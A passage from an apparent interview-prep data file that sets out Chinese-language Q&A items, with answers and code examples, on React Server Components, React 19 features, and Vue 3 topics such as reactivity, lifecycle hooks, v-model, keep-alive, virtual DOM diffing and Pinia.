                detailedAnswer: 'React Server Components（RSC）：\n\n- 服务端组件：在服务端渲染，不发送 JS 到客户端\n- 零客户端 JS：组件代码不打包到 bundle\n- 可直接访问数据库/文件系统/API\n- 渲染结果序列化为特殊格式传输\n\nRSC vs SSR：\n\n| 维度 | RSC（Server Components） | SSR（服务端渲染） |\n|------|--------------------------|-------------------|\n| 渲染时机 | 构建时/请求时 | 每次请求 |\n| JS 打包 | 不打包到客户端 | 全部打包 |\n| Hydration | 不需要 | 需要 |\n| 交互性 | 无（纯展示） | 有（Hydration 后） |\n| 数据获取 | 直接访问 DB/FS | 通过 API/props |\n| 重新渲染 | 服务端重新渲染 | 客户端状态驱动 |\n| 输出 | RSC 序列化协议 | HTML |\n\nRSC 工作流程：\n1. 服务端执行 Server Component\n2. 可直接 await 数据库查询/文件读取\n3. 渲染结果序列化为 RSC 协议（JSON-like）\n4. 客户端接收并渲染（不需 Hydration）\n5. Server Component 可嵌套 Client Component\n6. Client Component 不能导入 Server Component（但可作 children 传入）\n\n"use client" / "use server" 指令：\n- "use client"：标记客户端组件（需 Hydration、有交互）\n- "use server"：标记服务端 action（可被客户端调用）\n- 默认是 Server Component（Next.js App Router）\n\nRSC 的优势：\n1. 减少 bundle size：重型库（如 markdown 解析、日期处理）留服务端\n2. 直接访问后端：无需 API 层，直接查 DB\n3. SEO：服务端渲染内容\n4. 自动代码分割：Client Component 天然分割\n5. 流式渲染：配合 Suspense 逐步输出\n\nRSC 的限制：\n1. 不能用 useState/useEffect/事件处理\n2. 不能用 Context（但可传 props）\n3. 不能访问 window/document\n4. Client Component 不能导入 Server Component\n5. Server Component 可作为 children 传给 Client Component\n\n适用框架：\n- Next.js App Router（最成熟）\n- Remix（部分支持）\n- Waku（实验性）\n\n混合策略：\n- 静态内容/数据展示 → Server Component\n- 交互/状态/事件 → Client Component\n- 服务端数据获取 → Server Component 中 await\n- 表单提交 → Server Action（use server）',
                codeExample: `// Server Component（默认，无需标记）\n// app/users/page.tsx\nimport { db } from "@/lib/db"\n\nexport default async function UsersPage() {\n  // 直接访问数据库，无需 API\n  const users = await db.user.findMany()\n  return (\n    <div>\n      <h1>Users</h1>\n      <UserList users={users} />\n      <SearchBar /> {/* Client Component */}\n    </div>\n  )\n}\n\n// Client Component\n// app/users/SearchBar.tsx\n"use client"\nimport { useState } from "react"\n\nexport function SearchBar() {\n  const [query, setQuery] = useState("")\n  return <input value={query} onChange={(e) => setQuery(e.target.value)} />\n}\n\n// Server Action（表单提交）\n// app/actions.ts\n"use server"\nexport async function createUser(formData) {\n  await db.user.create({ data: { name: formData.get("name") } })\n  revalidatePath("/users")\n}\n\n// 表单使用 Server Action\nfunction AddUserForm() {\n  return (\n    <form action={createUser}>\n      <input name="name" />\n      <button type="submit">Add</button>\n    </form>\n  )\n}`,
                difficulty: 'hard',
                tags: ['Server Components', 'RSC', 'SSR', 'Next.js'],
                keyPoints: ['RSC 服务端渲染零 JS', '不需 Hydration', 'use client / use server 指令', 'Server Component 可嵌套 Client'],
              },
              {
                id: 'react-19-new-features',
                domain: 'react',
                question: 'React 19 有哪些重要新特性？use Hook 和 Actions 解决了什么问题？',
                shortAnswer: 'React 19 主要新特性：1) use Hook（在条件/循环中读取 Promise/Context）2) Actions（异步表单提交）3) useFormStatus/useFormState/useOptimistic 4) ref 作为 prop 传递 5) Document Metadata 6) 资源预加载。use 解决了不能在条件语句用 Hook 的限制；Actions 简化表单异步提交流程。',
                detailedAnswer: 'React 19 重要新特性：\n\n1. use Hook（条件式 Hook）：\n- 突破「Hooks 不能在条件/循环中调用」的限制\n- 可读取 Promise（自动 Suspense）和 Context\n- 每次渲染重新调用，符合条件分支\n\n2. Actions（表单异步处理）：\n- form 的 action 属性支持异步函数\n- 自动处理 pending/error/optimistic 状态\n- 配合 useFormStatus/useFormState/useOptimistic\n\n3. 新 Hook：\n- useFormStatus：子组件读取表单提交状态\n- useFormState：管理表单状态和返回值\n- useOptimistic：乐观更新（先展示后验证）\n\n4. ref 作为 prop 传递：\n- 不再需要 forwardRef 包装\n- 函数组件可直接接收 ref prop\n\n5. Document Metadata：\n- 组件内直接写 <title>/<meta>，自动 hoist 到 <head>\n\n6. 资源预加载 API：\n- prefetchDNS/preconnect/preload/preinit\n- 优化资源加载时机\n\nuse Hook 详解：\n\n- 传统 Hook 限制：必须在顶层调用，不能在条件/循环中\n- 原因：依赖调用顺序的链表\n- use Hook 打破限制：每次渲染重新调用，可条件分支\n- 适用：Promise.then、Context 读取\n- 注意：use(Promise) 触发 Suspense，use(Context) 等价 useContext\n\nActions 详解：\n\n- 传统表单提交：手写 onSubmit + fetch + try/catch + loading state\n- Actions：form action 接收 async formData，自动管理状态\n- 服务端集成：Server Action 直接处理表单\n- 状态管理：useFormState 拿返回值，useFormStatus 子组件读 pending\n\n乐观更新 useOptimistic：\n\n- 场景：点赞、评论等需即时反馈\n- 原理：在异步操作完成前展示预期结果\n- 冲突：实际返回后用真实数据覆盖\n- 体验：用户无感知延迟',
                codeExample: `// 1. use Hook（条件式读取 Promise）
import { use } from "react"

function UserProfile({ userId, showDetails }) {
  if (showDetails) {
    // 传统 useContext 不能在条件语句中，use 可以
    const theme = use(ThemeContext)
    const user = use(fetchUser(userId)) // 自动 Suspense
    return <div className={theme}>{user.name}</div>
  }
  return <div>Hidden</div>
}

// 2. Actions（表单异步提交）
function CommentForm() {
  const [state, formAction] = useFormState(async (prevState, formData) => {
    const comment = formData.get("comment")
    try {
      await postComment(comment)
      return { success: true }
    } catch (e) {
      return { error: e.message }
    }
  }, { success: false })

  return (
    <form action={formAction}>
      <input name="comment" />
      <SubmitButton />
      {state.error && <p>{state.error}</p>}
    </form>
  )
}

// 3. useFormStatus（子组件读表单状态）
function SubmitButton() {
  const { pending } = useFormStatus()
  return <button disabled={pending}>{pending ? "提交中..." : "提交"}</button>
}

// 4. useOptimistic（乐观更新）
function LikeButton({ likes, addLike }) {
  const [optimisticLikes, addOptimistic] = useOptimistic(
    likes,
    (state, newLike) => [...state, newLike]
  )
  return (
    <button onClick={async () => {
      addOptimistic({ id: "temp", pending: true }) // 立即展示
      await addLike() // 实际请求
    }}>
      {optimisticLikes.length} 赞
    </button>
  )
}

// 5. ref 作为 prop（无需 forwardRef）
function Input({ ref, ...props }) {
  return <input ref={ref} {...props} />
}
function App() {
  const inputRef = useRef()
  return <Input ref={inputRef} />
}

// 6. Document Metadata
function Page() {
  return (
    <>
      <title>我的页面</title>
      <meta name="description" content="页面描述" />
      <h1>内容</h1>
    </>
  )
}`,
                difficulty: 'hard',
                tags: ['React 19', 'use Hook', 'Actions', 'useOptimistic'],
                keyPoints: ['use 打破条件 Hook 限制', 'Actions 简化异步表单', 'useOptimistic 乐观更新', 'ref 可直接作 prop'],
              },
            ],
          },
        },
        {
          id: 'iv-p3-3',
          type: 'paragraph',
          lead: true,
          text: 'Vue 框架八股覆盖响应式原理、组件通信、生命周期、Composition API、指令、Vuex/Pinia 等。以下通过问答引擎自测。',
        },
        {
          id: 'iv-p3-4',
          type: 'demo',
          visualizationType: 'interview-quiz-engine',
          data: {
            domain: 'vue',
            mode: 'sequential',
            questions: [
              {
                id: 'vue-reactivity',
                domain: 'vue',
                question: 'Vue 3 响应式原理？与 React 状态更新机制的本质区别？',
                shortAnswer: 'Vue 3 用 Proxy 拦截对象 get/set，依赖收集（track）+ 触发更新（trigger），精准更新。React 是不可变状态 + diff 整棵组件树。Vue 精准依赖追踪，React 自上而下重渲染。',
                detailedAnswer: 'Vue 3 响应式原理：\n\n1. reactive(obj)：用 Proxy 包裹对象\n   - get：track 收集当前 effect 为依赖\n   - set：trigger 通知所有依赖的 effect 重新执行\n\n2. ref(value)：包裹基本类型，内部用对象 + get/set 实现\n\n3. effect：响应式副作用，依赖的响应式数据变化时自动重新执行\n\n4. computed：惰性 + 缓存的 effect，依赖未变直接返回缓存\n\n与 React 的本质区别：\n\n| 维度 | Vue 3 | React |\n|------|-------|-------|\n| 状态模型 | 可变（直接改 ref.value） | 不可变（setState 触发新状态） |\n| 更新粒度 | 组件级别精准（依赖追踪） | 组件树自上而下 diff |\n| 触发方式 | Proxy 自动追踪 | 显式调用 setState |\n| 性能 | 默认精准，无需 memo | 需 memo/useMemo/useCallback 优化 |\n| 心智模型 | 声明式响应 | 不可变数据流 |\n\n设计哲学：\n- Vue：响应式系统精准追踪依赖，编译时静态分析优化\n- React：函数式不可变 + diff 整树，靠 memo 优化\n- React 18 后编译（React Compiler）试图自动化 memo，趋近 Vue 的精准更新',
                difficulty: 'hard',
                tags: ['Vue3', '响应式', 'Proxy', '面试必考'],
                keyPoints: ['Vue Proxy 拦截 + 依赖收集', 'React 不可变 + diff', 'Vue 精准更新', 'React 需手动 memo'],
              },
              {
                id: 'vue-computed-watch',
                domain: 'vue',
                question: 'Vue 中 computed、watch、methods 的区别？何时用哪个？',
                shortAnswer: 'computed 缓存依赖追踪的派生值；watch 监听数据变化执行副作用；methods 普通函数每次调用都执行。计算属性用于派生状态，watch 用于响应变化执行异步或开销大的操作。',
                detailedAnswer: '三者区别：\n\n| 维度 | computed | watch | methods |\n|------|----------|-------|---------|\n| 缓存 | 有（依赖不变不重算） | 无 | 无 |\n| 返回值 | 返回派生值 | 无返回 | 任意 |\n| 用途 | 派生状态 | 响应变化执行副作用 | 通用函数 |\n| 触发 | 依赖变化 | 监听值变化 | 手动调用 |\n| 异步 | 不支持 | 支持 | 支持 |\n\ncomputed（计算属性）：\n- 缓存：依赖的响应式数据未变，多次访问返回缓存值\n- 必须返回值，适合派生数据\n- 例：fullName = firstName + lastName\n- Vue 3：const fullName = computed(() => first.value + last.value)\n\nwatch（侦听器）：\n- 监听某个响应式数据，变化时执行回调\n- 适合异步或开销大的操作（如发请求）\n- 例：watch(userId, () => fetchUser(userId))\n- Vue 3：watch(userId, (newVal, oldVal) => {})\n- watchEffect：自动收集依赖，立即执行一次\n\nmethods（方法）：\n- 普通函数，每次调用都执行\n- 适合无缓存的逻辑、事件处理\n\n选择原则：\n- 派生值 → computed（有缓存）\n- 响应变化执行副作用 → watch\n- 通用逻辑 → methods\n- 避免在 template 中调用 method 做计算（无缓存）',
                difficulty: 'medium',
                tags: ['Vue', 'computed', 'watch'],
                keyPoints: ['computed 有缓存', 'watch 适合副作用', 'methods 无缓存', '派生值用 computed'],
              },
              {
                id: 'vue-component-communication',
                domain: 'vue',
                question: 'Vue 组件通信有哪些方式？分别适用什么场景？',
                shortAnswer: '父子：props/emit、ref、v-model。兄弟：状态提升、provide/inject、EventBus（Vue 3 移除）。跨级：provide/inject。全局：Pinia/Vuex、EventBus。复杂用 Pinia，简单用 props/emit。',
                detailedAnswer: 'Vue 组件通信方式：\n\n1. 父→子：props\n- 父组件传数据，子组件声明 props 接收\n- 单向数据流，子组件不能直接改 props\n\n2. 子→父：emit 自定义事件\n- 子组件 emit 事件，父组件监听\n- v-model 语法糖（:value + @input）\n\n3. 父→子实例：ref\n- 父组件通过 ref 直接访问子组件实例\n- 适合调用子组件方法，不推荐滥用\n\n4. 跨级：provide / inject\n- 祖先 provide 数据，后代 inject 使用\n- 类似 React Context，跨多层传值\n- Vue 3 用 ref/reactive 包裹保持响应式\n\n5. 兄弟组件：\n- 状态提升：共同父组件管理\n- EventBus：事件总线（Vue 3 已移除，需第三方如 mitt）\n- Pinia/Vuex：全局状态\n\n6. 全局状态：Pinia / Vuex\n- 复杂应用、多组件共享状态\n- Pinia 是 Vue 3 官方推荐，更简洁\n\n7. v-model：双向绑定语法糖\n- Vue 3：v-model = :modelValue + @update:modelValue\n- 支持多个 v-model：v-model:title\n\n选择原则：\n- 父子简单通信 → props/emit\n- 父子双向 → v-model\n- 跨级 → provide/inject\n- 兄弟 → Pinia 或状态提升\n- 全局复杂 → Pinia\n- 尽量少用 ref 直接操作、EventBus',
                codeExample: `// 1. 父子 props/emit
// 父
<Child :count="count" @increment="count++" v-model:title="title" />\n// 子
props: ['count', 'modelValue']\nemits: ['increment', 'update:modelValue']\n\n// 2. provide/inject（跨级）\n// 祖先\nimport { provide, ref } from "vue"\nconst theme = ref("dark")\nprovide("theme", theme)\n// 后代\nimport { inject } from "vue"\nconst theme = inject("theme") // 响应式\n\n// 3. Pinia（全局状态）\nimport { defineStore } from "pinia"\nexport const useUserStore = defineStore("user", () => {\n  const name = ref("")\n  const setName = (n) => (name.value = n)\n  return { name, setName }\n})\n// 组件中使用\nconst userStore = useUserStore()\nuserStore.setName("Alice")`,
                difficulty: 'medium',
                tags: ['Vue', '组件通信', 'provide/inject'],
                keyPoints: ['父子 props/emit', '跨级 provide/inject', '全局 Pinia', 'v-model 双向语法糖'],
              },
              {
                id: 'vue-lifecycle',
                domain: 'vue',
                question: 'Vue 3 的生命周期钩子有哪些？与 Vue 2 的区别？',
                shortAnswer: 'Vue 3 Options：beforeCreate/created/beforeMount/mounted/beforeUpdate/updated/beforeUnmount/unmounted。Composition：setup 替代 beforeCreate/created，其余加 on 前缀（onMounted 等）。Vue 2 beforeDestroy→Vue 3 beforeUnmount。',
                detailedAnswer: 'Vue 3 生命周期（Options API）：\n1. beforeCreate：实例创建前，data/methods 不可用\n2. created：实例创建后，data/methods 可用，未挂载（常发请求）\n3. beforeMount：挂载前，render 首次调用前\n4. mounted：挂载后，DOM 可访问（常操作 DOM）\n5. beforeUpdate：数据变化更新 DOM 前\n6. updated：数据变化更新 DOM 后\n7. beforeUnmount（Vue 2 beforeDestroy）：卸载前，实例仍可用（常清理定时器/事件）\n8. unmounted（Vue 2 destroyed）：卸载后\n9. errorCaptured：捕获后代组件错误\n10. activated/deactivated：keep-alive 激活/停用\n\nComposition API 对应：\n- beforeCreate/created → 直接在 setup 中写\n- beforeMount → onBeforeMount\n- mounted → onMounted\n- beforeUpdate → onBeforeUpdate\n- updated → onUpdated\n- beforeUnmount → onBeforeUnmount\n- unmounted → onUnmounted\n- errorCaptured → onErrorCaptured\n- activated → onActivated\n- deactivated → onDeactivated\n\nVue 2 vs Vue 3 主要变化：\n- beforeDestroy → beforeUnmount（语义更准确）\n- destroyed → unmounted\n- 新增 setup（替代 beforeCreate/created）\n- Composition API 钩子需手动导入\n\n常见场景：\n- created/setup：发请求获取数据\n- mounted/onMounted：操作 DOM、初始化第三方库\n- beforeUnmount/onBeforeUnmount：清理定时器、移除事件监听\n- activated/onActivated：keep-alive 组件激活时刷新数据\n\n父子组件执行顺序：\n- 挂载：父 beforeMount → 子 beforeMount → 子 mounted → 父 mounted\n- 更新：父 beforeUpdate → 子 beforeUpdate → 子 updated → 父 updated\n- 卸载：父 beforeUnmount → 子 beforeUnmount → 子 unmounted → 父 unmounted',
                codeExample: `// Options API
export default {\n  data() { return { count: 0 } },\n  beforeCreate() { console.log("beforeCreate") },\n  created() { console.log("created"); this.fetchData() },\n  mounted() { console.log("mounted"); this.initChart() },\n  beforeUnmount() { console.log("beforeUnmount"); this.cleanup() },\n}\n\n// Composition API（Vue 3 推荐）\nimport { onMounted, onBeforeUnmount, onUpdated } from "vue"\n\nexport default {\n  setup() {\n    // 相当于 beforeCreate + created\n    console.log("setup")\n    onMounted(() => {\n      console.log("mounted")\n      initChart()\n    })\n    onUpdated(() => console.log("updated"))\n    onBeforeUnmount(() => {\n      console.log("beforeUnmount")\n      cleanup()\n    })\n    return {}\n  },\n}`,
                difficulty: 'medium',
                tags: ['Vue3', '生命周期', 'Composition API'],
                keyPoints: ['Vue 3 beforeUnmount 替代 beforeDestroy', 'setup 替代 beforeCreate/created', 'Composition 加 on 前缀', '父子挂载顺序'],
              },
              {
                id: 'vue-v-model',
                domain: 'vue',
                question: 'Vue 中 v-model 的原理？如何自定义组件的 v-model？',
                shortAnswer: 'v-model 是语法糖：Vue 2 = :value + @input；Vue 3 = :modelValue + @update:modelValue。自定义组件需声明 props（modelValue）和 emits（update:modelValue），可配置 model 选项指定 prop/event，Vue 3 支持多个 v-model。',
                detailedAnswer: 'v-model 原理：\n\nVue 2：\n- 表单元素：v-model = :value + @input\n- 自定义组件：默认 :value + @input，可通过 model 选项自定义\n- .sync 修饰符：:title.sync = :title + @update:title\n\nVue 3：\n- 表单元素：根据类型不同（text 用 input，checkbox/radio 用 change）\n- 自定义组件：:modelValue + @update:modelValue\n- 多个 v-model：v-model:title="title" v-model:content="content"\n- 修饰符：v-model.title.capitalize，通过 modelModifiers prop 接收\n\n自定义组件实现 v-model：\n```\n// Vue 3\nprops: { modelValue: String },\nemits: ["update:modelValue"],\nmethods: {\n  handleInput(e) {\n    this.$emit("update:modelValue", e.target.value)\n  },\n}\n// 模板\n<input :value="modelValue" @input="handleInput" />\n```\n\n多个 v-model：\n```\n<CustomInput v-model:title="title" v-model:content="content" />\n// 子组件\nprops: ["title", "content"]\nemits: ["update:title", "update:content"]\n```\n\n修饰符：\n```\n<CustomInput v-model.capitalize="text" />\n// 子组件\nprops: { modelValue: String, modelModifiers: { default: () => ({}) } }\nemits: ["update:modelValue"]\ncreated() {\n  if (this.modelModifiers.capitalize) {\n    // 处理 capitalize 修饰符\n  }\n}\n```\n\nv-model 修饰符：\n- .trim：去除首尾空格\n- .number：转为数字\n- .lazy：change 事件触发（而非 input）\n- Vue 3 支持自定义修饰符',
                codeExample: `// Vue 3 自定义组件 v-model\n// 子组件 CustomInput.vue\n<script setup>\nconst props = defineProps({\n  modelValue: String,\n  modelModifiers: { default: () => ({}) },\n})\nconst emit = defineEmits(["update:modelValue"])\n\nfunction handleInput(e) {\n  let val = e.target.value\n  if (props.modelModifiers.capitalize) {\n    val = val.charAt(0).toUpperCase() + val.slice(1)\n  }\n  emit("update:modelValue", val)\n}\n</script>\n\n<template>\n  <input :value="modelValue" @input="handleInput" />\n</template>\n\n// 父组件使用\n<CustomInput v-model.capitalize="text" />\n// 等价于\n<CustomInput\n  :modelValue="text"\n  @update:modelValue="text = $event"\n  :modelModifiers="{ capitalize: true }"\n/>\n\n// 多个 v-model\n<UserForm v-model:name="name" v-model:age="age" />`,
                difficulty: 'medium',
                tags: ['Vue', 'v-model', '语法糖'],
                keyPoints: ['Vue 3 modelValue + update:modelValue', '支持多个 v-model', '可自定义修饰符', '.trim/.number/.lazy 内置修饰符'],
              },
              {
                id: 'vue-keep-alive',
                domain: 'vue',
                question: 'keep-alive 的原理和使用？如何缓存特定组件？',
                shortAnswer: 'keep-alive 缓存组件实例，切换时不销毁。内部维护 cache 对象（key→vnode）和 keys 数组。通过 include/exclude/max 控制。被缓存组件触发 activated/deactivated 而非 mounted/unmounted。',
                detailedAnswer: 'keep-alive 原理：\n\n核心机制：\n- 抽象组件（不渲染真实 DOM，自身不出现到组件链）\n- 内部维护 cache（Map：key→vnode）和 keys（LRU 顺序）\n- 首次渲染：渲染子组件并缓存\n- 切换回来：从 cache 取 vnode 复用，不重新创建组件\n- 超过 max：用 LRU 算法淘汰最久未访问的\n\nProps：\n- include：字符串/正则/数组，匹配组件 name 才缓存\n- exclude：相反，匹配的不缓存\n- max：最大缓存数，超过用 LRU 淘汰\n\n生命周期：\n- 首次进入：created → mounted → activated\n- 离开：deactivated（不触发 unmounted）\n- 再次进入：activated（不触发 mounted）\n- 强制销毁才 unmounted\n\n使用场景：\n- 列表页 → 详情页 → 返回列表（保持滚动位置/筛选状态）\n- Tab 切换保持状态\n- 表单多步骤保留输入\n\n注意事项：\n- 必须有组件 name 才能用 include/exclude\n- max 设置合理，避免内存泄漏\n- 缓存的组件需手动刷新数据时用 onActivated\n- 配合 vue-router 用 <router-view v-slot> 包裹 keep-alive',
                codeExample: `// 基础用法\n<keep-alive>\n  <component :is="currentComponent" />\n</keep-alive>\n\n// include/exclude/max\n<keep-alive :include="['UserList', 'ProductList']" :max="10">\n  <component :is="currentComponent" />\n</keep-alive>\n\n// 配合 vue-router\n<router-view v-slot="{ Component }">\n  <keep-alive :include="cachedViews">\n    <component :is="Component" />\n  </keep-alive>\n</router-view>\n\n// 被缓存组件使用 activated 刷新数据\nimport { onActivated } from "vue"\nonActivated(() => {\n  // 从详情页返回时刷新列表\n  refreshList()\n})\n\n// Vue 2 写法\n<keep-alive include="UserList,ProductList" :max="10">\n  <router-view />\n</keep-alive>\n\nexport default {\n  name: "UserList", // 必须有 name 才能被 include 匹配\n  activated() { this.refreshList() },\n  deactivated() { this.saveScrollPosition() },\n}`,
                difficulty: 'medium',
                tags: ['Vue', 'keep-alive', '缓存'],
                keyPoints: ['内部 cache + LRU 淘汰', 'include/exclude/max 控制', '触发 activated/deactivated', '配合 router-view 缓存路由组件'],
              },
              {
                id: 'vue-virtual-dom-diff',
                domain: 'vue',
                question: 'Vue 的虚拟 DOM 和 Diff 算法？与 React Diff 有何区别？',
                shortAnswer: 'Vue 虚拟 DOM：VNode 对象描述真实 DOM。Diff 同层比较 + 双端比较（Vue 2）/ 最长递增子序列（Vue 3）。React 用单向从左到右 + key。Vue 3 编译期静态优化（静态提升、PatchFlag）减少 Diff 范围。',
                detailedAnswer: 'Vue 虚拟 DOM：\n\nVNode 结构：\n- type：标签/组件\n- props：属性\n- children：子节点\n- key：diff 标识\n- el：对应真实 DOM\n\nDiff 算法核心：\n1. 同层比较：只比较同层级节点，不跨层\n2. 类型不同直接替换：旧节点删除，新节点创建\n3. 类型相同更新属性 + 递归比较子节点\n\nVue 2 Diff（双端比较）：\n- 用 4 个指针：oldStart、oldEnd、newStart、newEnd\n- 4 种比较：头头、尾尾、头尾、尾头\n- 都不匹配则用 key 在旧节点中查找\n- 减少移动次数\n\nVue 3 Diff（最长递增子序列 LIS）：\n- 先处理头部相同、尾部相同\n- 中间部分用 key 建立索引\n- 新节点中找出旧节点存在的，求最长递增子序列\n- LIS 中的节点不动，其他节点移动\n- 比 Vue 2 移动次数更少\n\nVue 3 编译期优化（减少 Diff）：\n1. 静态提升：静态节点提取到 render 外，复用\n2. PatchFlag：动态节点标记（TEXT/CLASS/PROPS 等），Diff 时只比较动态部分\n3. BlockTree：以动态节点为根的树，跳过静态部分\n4. 缓存事件处理器：cacheHandlers\n\n与 React Diff 区别：\n\n| 维度 | Vue 3 | React |\n|------|-------|------|\n| 算法 | 双端/LIS | 单向从左到右 + key |\n| 移动次数 | 更少（LIS 优化） | 较多 |\n| 编译优化 | 静态提升/PatchFlag | 无（React Compiler 在路上） |\n| 静态节点 | 不参与 Diff | 仍参与 Diff |\n| key 作用 | 复用节点 | 复用节点 |\n\nkey 的作用：\n- 帮助 Diff 识别节点：相同 key 复用，不同 key 重建\n- 列表必须用稳定唯一的 key（用 id，不用 index）\n- index 作为 key 的问题：数据顺序变化导致状态错乱',
                codeExample: `// VNode 结构\nconst vnode = {\n  type: "div",\n  props: { class: "container" },\n  children: [\n    { type: "h1", props: {}, children: "Hello", key: "title" },\n    { type: "p", props: {}, children: "World", key: "desc" },\n  ],\n  key: null,\n  el: undefined,\n}\n\n// Vue 3 PatchFlag 示例（编译后）\n// 模板：<div><h1>Static</h1><p>{{ dynamic }}</p></div>\n// 编译为（简化）：\nconst vnode = {\n  type: "div",\n  children: [\n    // 静态节点提升到外部，不参与 diff\n    hoistedStatic,\n    // 动态节点标记 PatchFlag\n    { type: "p", children: ctx.dynamic, patchFlag: 1 /* TEXT */ },\n  ],\n  dynamicChildren: [/* 只有动态节点 */], // BlockTree\n}\n\n// key 使用\n// ❌ 用 index（顺序变化导致状态错乱）\n<li v-for="(item, index) in list" :key="index">{{ item }}</li>\n// ✅ 用 id\n<li v-for="item in list" :key="item.id">{{ item }}</li>`,
                difficulty: 'hard',
                tags: ['Vue3', '虚拟DOM', 'Diff', 'LIS'],
                keyPoints: ['同层比较不跨层', 'Vue 3 用 LIS 优化移动', '编译期 PatchFlag/BlockTree', 'key 帮助复用节点'],
              },
              {
                id: 'vue-composition-api',
                domain: 'vue',
                question: 'Composition API 和 Options API 的区别？为何要引入 Composition API？',
                shortAnswer: 'Options API 按 options（data/methods/computed）组织，逻辑分散。Composition API 按逻辑组织，相关代码集中，易抽取复用。解决大型组件逻辑分散、mixin 命名冲突/来源不清问题。',
                detailedAnswer: 'Options API（Vue 2）：\n- 按 options 组织：data、methods、computed、watch、生命周期\n- 同一逻辑分散在多个 options 中\n- 缺点：逻辑分散、复用难（mixin 易冲突）\n\nComposition API（Vue 3）：\n- setup() 函数内组织逻辑\n- 相关逻辑的 state/methods/computed 集中\n- 优点：逻辑聚合、易复用、TS 支持好\n\n为何引入 Composition API：\n\n1. 逻辑组织：\n- Options：同一功能的 data/methods/computed 分散\n- Composition：同一功能的代码集中\n- 大组件更易维护\n\n2. 逻辑复用：\n- Options：用 mixin，但有命名冲突、来源不清、类型推断差\n- Composition：自定义 Hook（useXxx），无冲突、清晰、TS 友好\n\n3. 类型推断：\n- Options API 的 this 类型推断复杂\n- Composition API 普通函数，TS 推断自然\n\n4. 代码压缩：\n- Composition API 中变量名可压缩\n- Options API 的属性名不可压缩\n\n对比示例（鼠标位置追踪）：\n```\n// Options API\nexport default {\n  data() { return { x: 0, y: 0 } },\n  mounted() { window.addEventListener("mousemove", this.update) },\n  beforeUnmount() { window.removeEventListener("mousemove", this.update) },\n  methods: { update(e) { this.x = e.pageX; this.y = e.pageY } },\n}\n\n// Composition API（同一逻辑集中）\nfunction useMouse() {\n  const x = ref(0), y = ref(0)\n  function update(e) { x.value = e.pageX; y.value = e.pageY }\n  onMounted(() => window.addEventListener("mousemove", update))\n  onBeforeUnmount(() => window.removeEventListener("mousemove", update))\n  return { x, y }\n}\nexport default { setup() { return { ...useMouse() } } }\n```\n\n复用：useMouse 可单独抽到文件，多组件 import 使用。\n\nsetup 语法糖（Vue 3.2+）：\n- <script setup> 自动暴露变量到模板\n- 编译时优化，更简洁\n- defineProps/defineEmits/defineExpose 编译宏\n\n何时仍用 Options API：\n- 简单组件、逻辑少\n- 团队不熟悉 Composition\n- 渐进式迁移旧项目',
                codeExample: `// 1. Composition API 自定义 Hook 复用\n// composables/useFetch.ts\nimport { ref, onMounted } from "vue"\nexport function useFetch(url) {\n  const data = ref(null)\n  const error = ref(null)\n  const loading = ref(true)\n  onMounted(async () => {\n    try {\n      data.value = await fetch(url).then((r) => r.json())\n    } catch (e) {\n      error.value = e\n    } finally {\n      loading.value = false\n    }\n  })\n  return { data, error, loading }\n}\n\n// 组件中使用\n<script setup>\nimport { useFetch } from "@/composables/useFetch"\nconst { data, error, loading } = useFetch("/api/user")\n</script>\n\n<template>\n  <div v-if="loading">Loading...</div>\n  <div v-else-if="error">{{ error }}</div>\n  <div v-else>{{ data }}</div>\n</template>\n\n// 2. <script setup> 语法糖\n<script setup>\nimport { ref, computed } from "vue"\nconst props = defineProps({ initialCount: { type: Number, default: 0 } })\nconst emit = defineEmits(["change"])\nconst count = ref(props.initialCount)\nconst double = computed(() => count.value * 2)\nfunction increment() {\n  count.value++\n  emit("change", count.value)\n}\ndefineExpose({ count, increment }) // 暴露给父组件 ref\n</script>`,
                difficulty: 'medium',
                tags: ['Vue3', 'Composition API', 'Options API'],
                keyPoints: ['按逻辑组织 vs 按 option 组织', '解决 mixin 复用问题', 'TS 类型推断更好', 'setup 语法糖更简洁'],
              },
              {
                id: 'vue-pinia-vuex',
                domain: 'vue',
                question: 'Pinia 和 Vuex 的区别？为何 Vue 3 推荐 Pinia？',
                shortAnswer: 'Pinia 是 Vue 3 官方推荐状态管理。区别：Pinia 无 mutation（直接改 state）、TS 支持好、模块扁平化（无嵌套 module）、体积小、DevTools 支持好。Vuex 有 mutation 同步限制，模块嵌套复杂。',
                detailedAnswer: 'Pinia vs Vuex：\n\n| 维度 | Pinia | Vuex |\n|------|-------|------|\n| 状态修改 | 直接改或 action | 必须 mutation（同步） |\n| 模块 | 扁平化（每个 store 独立） | 嵌套 module（namespaced） |\n| TS 支持 | 原生优秀 | 较弱（需 ModuleTree 类型） |\n| 体积 | ~1KB | ~3KB |\n| Mutation | 无 | 有（同步改 state） |\n| Action | 同步/异步均可 | 仅异步 |\n| DevTools | 完整支持 + 时间旅行 | 完整支持 |\n| Composition API | 原生支持 | 需适配 |\n| 学习成本 | 低 | 中 |\n\nPinia 优势：\n\n1. 无 mutation：\n- Vuex 强制 mutation 修改 state（同步），action 异步触发 mutation\n- Pinia 直接改 state 或在 action 中改，简化流程\n- 实际 mutation 多余，Pinia 去除\n\n2. 扁平化模块：\n- Vuex：modules 嵌套，访问 `commit("user/login")`，命名空间复杂\n- Pinia：每个 store 独立扁平，`useUserStore()` 直接调用\n- 无命名空间冲突\n\n3. TS 支持：\n- Pinia 自动推断 state/getters/actions 类型\n- Vuex 需手动声明 ModuleTree 类型，推断弱\n\n4. Composition API 友好：\n- Pinia 用 setup 函数定义 store，与组件一致\n- Vuex 仍用 options 风格\n\n5. 按需引入：\n- Pinia：const { name } = storeToRefs(store) 解构保持响应式\n- Vuex：mapState/mapActions 辅助函数\n\nPinia 使用：\n```\nimport { defineStore } from "pinia"\n\n// Options Store\nexport const useUserStore = defineStore("user", {\n  state: () => ({ name: "", age: 0 }),\n  getters: { fullName: (state) => state.name + " Smith" },\n  actions: {\n    async fetchUser() { this.name = await api.getUser() },\n  },\n})\n\n// Setup Store（推荐，更灵活）\nexport const useUserStore = defineStore("user", () => {\n  const name = ref(""), age = ref(0)\n  const fullName = computed(() => name.value + " Smith")\n  async function fetchUser() { name.value = await api.getUser() }\n  return { name, age, fullName, fetchUser }\n})\n```\n\n组件中使用：\n```\nconst userStore = useUserStore()\nuserStore.fetchUser()\nconst { name } = storeToRefs(userStore) // 解构保持响应式\n```',
